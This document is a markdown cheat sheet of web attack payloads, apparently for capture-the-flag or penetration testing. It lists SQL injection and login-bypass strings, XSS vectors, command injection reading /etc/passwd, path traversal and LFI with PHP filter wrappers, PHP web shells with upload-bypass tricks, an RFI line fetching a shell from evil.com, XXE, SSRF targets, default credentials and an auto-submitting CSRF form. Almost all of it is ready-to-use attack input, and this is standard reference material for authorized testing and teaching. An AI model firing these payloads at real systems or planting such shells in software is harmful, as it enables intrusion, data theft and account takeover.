# Quick Payload Reference

## SQL Injection

### Basic Tests
```
'
''
' OR '1
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR '1'='1'#
' OR '1'='1' LIMIT 1--
```

### Union-Based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--
```

### Boolean-Based Blind
```
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
```

### Time-Based Blind
```
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
'; SELECT pg_sleep(5)--
```

### Authentication Bypass
```
admin'--
admin'/*
admin' OR '1'='1
admin' OR '1'='1'--
' OR '1'='1'--
' OR 1=1--
```

## XSS (Cross-Site Scripting)

### Basic
```
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<IMG SRC="javascript:alert('XSS');">
```

### Event Handlers
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Encoded
```
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

### Filter Bypass
```
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<svg><script>alert('XSS')</script></svg>
```

## Command Injection

### Basic
```
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
```

### File Reading
```
; cat /etc/passwd
| cat /etc/passwd
; cat /etc/passwd | grep root
```

### Command Chaining
```
; ls; pwd; whoami
| ls | grep flag
&& cat flag.txt
```

## Path Traversal

### Basic
```
../../etc/passwd
....//....//etc/passwd
..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Encoded
```
..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
```

### Windows
```
..\..\..\windows\system32\drivers\etc\hosts
....//....//windows//system32//drivers//etc//hosts
```

## File Upload

### PHP Shell
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php phpinfo(); ?>
```

### Extensions to Try
```
.php
.phtml
.php3
.php4
.php5
.php7
.phps
.pht
```

### Bypass Techniques
```
file.php.jpg
file.php%00.jpg
file.php;.jpg
file.php%20.jpg
file.pHp
```

## Local File Inclusion (LFI)

### Basic
```
?page=../../etc/passwd
?file=../../etc/passwd
?include=../../etc/passwd
?path=../../etc/passwd
```

### With Null Byte
```
?page=../../etc/passwd%00
?file=../../etc/passwd%00.php
```

### PHP Wrappers
```
?page=php://filter/read=string.rot13/resource=../../etc/passwd
?page=php://filter/convert.base64-encode/resource=../../etc/passwd
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

## Remote File Inclusion (RFI)

### Basic
```
?page=http://evil.com/shell.php
?include=http://evil.com/shell.php
?file=http://evil.com/shell.php
```

## XXE (XML External Entity)

### Basic
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### PHP Wrapper
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=../../etc/passwd">]>
<foo>&xxe;</foo>
```

## SSRF (Server-Side Request Forgery)

### Internal Services
```
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:27017
http://localhost/admin
```

### File Protocol
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### Encoded
```
http://127.0.0.1 → http://2130706433
http://127.0.0.1 → http://0x7f000001
```

## Authentication Bypass

### SQL Injection in Login
```
admin'--
admin' OR '1'='1'--
' OR '1'='1'--
' OR '1'='1' LIMIT 1--
```

### Default Credentials
```
admin:admin
admin:password
admin:123456
root:root
guest:guest
administrator:administrator
```

## IDOR Testing

### URL Manipulation
```
?id=1 → ?id=2
?user=1 → ?user=999
?account=123 → ?account=456
```

### HTTP Methods
```
GET → POST
POST → PUT
GET → DELETE
```

## CSRF Testing

### Basic Form
```html
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

## Session Testing

### Session Fixation
```
Set-Cookie: PHPSESSID=attacker_controlled_value
```

### Predictable Tokens
```
Check if session IDs are sequential or predictable
Try: sessionid=1, sessionid=2, etc.
```

